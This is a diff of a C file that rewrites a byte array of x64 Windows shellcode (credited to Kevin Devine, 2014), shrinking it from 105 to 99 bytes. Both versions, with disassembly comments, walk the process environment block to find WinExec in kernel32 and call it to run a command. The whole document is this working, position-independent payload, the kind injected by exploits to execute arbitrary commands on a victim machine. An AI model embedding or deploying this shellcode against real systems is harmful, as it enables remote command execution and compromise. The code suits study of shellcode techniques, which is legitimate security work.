@@ -5,7 +5,7 @@
 #define MAX_CMD_LEN 255
 
 /* Copyright (c) 2014 Kevin Devine */
-/* Size = 105 bytes */
+/* Size = 99 bytes */
 
 char exec64[] = {
   /* 0000 */  "\x53"                          /*  push rbx                           */
@@ -13,7 +13,7 @@ char exec64[] = {
   /* 0002 */  "\x57"                          /*  push rdi                           */
   /* 0003 */  "\x55"                          /*  push rbp                           */
   /* 0004 */  "\x48\x83\xEC\x48"              /*  sub rsp, 48h                       */
-  /* 0008 */  "\xEB\x5A"                      /*  jmp 00000064h                      */
+  /* 0008 */  "\xEB\x54"                      /*  jmp 0000005Eh                      */
   /* 000A */  "\x6A\x60"                      /*  push 00000060h                     */
   /* 000C */  "\x59"                          /*  pop rcx                            */
   /* 000D */  "\x65\x48\x8B\x31"              /*  mov rsi, qword ptr [rcx]           */
@@ -21,33 +21,35 @@ char exec64[] = {
   /* 0015 */  "\x48\x8B\x76\x10"              /*  mov rsi, qword ptr [rsi+10h]       */
   /* 0019 */  "\x48\xAD"                      /*  lodsq                              */
   /* 001B */  "\x48\x8B\x30"                  /*  mov rsi, qword ptr [rax]           */
-  /* 001E */  "\x48\x8B\x7E\x30"              /*  mov rdi, qword ptr [rsi+30h]       */
-  /* 0022 */  "\x03\x4F\x3C"                  /*  add ecx, dword ptr [rdi+3Ch]       */
-  /* 0025 */  "\x8B\x5C\x39\x28"              /*  mov ebx, dword ptr [rcx+rdi+28h]   */
-  /* 0029 */  "\x8B\x74\x3B\x20"              /*  mov esi, dword ptr [rbx+rdi+20h]   */
-  /* 002D */  "\x48\x03\xF7"                  /*  add rsi, rdi                       */
-  /* 0030 */  "\x8B\x4C\x3B\x24"              /*  mov ecx, dword ptr [rbx+rdi+24h]   */
-  /* 0034 */  "\x48\x03\xCF"                  /*  add rcx, rdi                       */
-  /* 0037 */  "\x33\xD2"                      /*  xor edx, edx                       */
-  /* 0039 */  "\x0F\xB7\x2C\x51"              /*  movzx ebp, word ptr [rcx+rdx*2]    */
-  /* 003D */  "\xFF\xC2"                      /*  inc edx                            */
-  /* 003F */  "\xAD"                          /*  lodsd                              */
-  /* 0040 */  "\x81\x3C\x38\x57\x69\x6E\x45"  /*  cmp dword ptr [rax+rdi], 456E6957h */
-  /* 0047 */  "\x75\xF0"                      /*  jne 00000039h                      */
-  /* 0049 */  "\x8B\x74\x3B\x1C"              /*  mov esi, dword ptr [rbx+rdi+1Ch]   */
-  /* 004D */  "\x48\x03\xF7"                  /*  add rsi, rdi                       */
-  /* 0050 */  "\x8B\x04\xAE"                  /*  mov eax, dword ptr [rsi+rbp*4]     */
-  /* 0053 */  "\x48\x03\xC7"                  /*  add rax, rdi                       */
-  /* 0056 */  "\x33\xD2"                      /*  xor edx, edx                       */
-  /* 0058 */  "\x59"                          /*  pop rcx                            */
-  /* 0059 */  "\xFF\xD0"                      /*  call rax                           */
-  /* 005B */  "\x48\x83\xC4\x48"              /*  add rsp, 48h                       */
-  /* 005F */  "\x5D"                          /*  pop rbp                            */
-  /* 0060 */  "\x5F"                          /*  pop rdi                            */
-  /* 0061 */  "\x5E"                          /*  pop rsi                            */
-  /* 0062 */  "\x5B"                          /*  pop rbx                            */
-  /* 0063 */  "\xC3"                          /*  ret                                */
-  /* 0064 */  "\xE8\xA1\xFF\xFF\xFF"          /*  call 0000000Ah                     */
+  /* 001E */  "\x48\x8B\x6E\x30"              /*  mov rbp, qword ptr [rsi+30h]       */
+  /* 0022 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [rbp+3Ch]       */
+  /* 0025 */  "\x03\xC1"                      /*  add eax, ecx                       */
+  /* 0027 */  "\x8B\x5C\x28\x28"              /*  mov ebx, dword ptr [rax+rbp+28h]   */
+  /* 002B */  "\x48\x8D\x74\x2B\x1C"          /*  lea rsi, qword ptr [rbx+rbp+1Ch]   */
+  /* 0030 */  "\xB1\x03"                      /*  mov cl, 03h                        */
+  /* 0032 */  "\xAD"                          /*  lodsd                              */
+  /* 0033 */  "\x48\x03\xC5"                  /*  add rax, rbp                       */
+  /* 0036 */  "\x50"                          /*  push rax                           */
+  /* 0037 */  "\xE2\xF9"                      /*  loop 00000032h                     */
+  /* 0039 */  "\x5F"                          /*  pop rdi                            */
+  /* 003A */  "\x5E"                          /*  pop rsi                            */
+  /* 003B */  "\x5B"                          /*  pop rbx                            */
+  /* 003C */  "\x0F\xB7\x14\x4F"              /*  movzx edx, word ptr [rdi+rcx*2]    */
+  /* 0040 */  "\xFF\xC1"                      /*  inc ecx                            */
+  /* 0042 */  "\xAD"                          /*  lodsd                              */
+  /* 0043 */  "\x81\x3C\x28\x57\x69\x6E\x45"  /*  cmp dword ptr [rax+rbp], 456E6957h */
+  /* 004A */  "\x75\xF0"                      /*  jne 0000003Ch                      */
+  /* 004C */  "\x8B\x04\x93"                  /*  mov eax, dword ptr [rbx+rdx*4]     */
+  /* 004F */  "\x48\x03\xC5"                  /*  add rax, rbp                       */
+  /* 0052 */  "\x59"                          /*  pop rcx                            */
+  /* 0053 */  "\xFF\xD0"                      /*  call rax                           */
+  /* 0055 */  "\x48\x83\xC4\x48"              /*  add rsp, 48h                       */
+  /* 0059 */  "\x5D"                          /*  pop rbp                            */
+  /* 005A */  "\x5F"                          /*  pop rdi                            */
+  /* 005B */  "\x5E"                          /*  pop rsi                            */
+  /* 005C */  "\x5B"                          /*  pop rbx                            */
+  /* 005D */  "\xC3"                          /*  ret                                */
+  /* 005E */  "\xE8\xA7\xFF\xFF\xFF"          /*  call 0000000Ah                     */
 };
 
 int main (int argc, char* argv[]) {
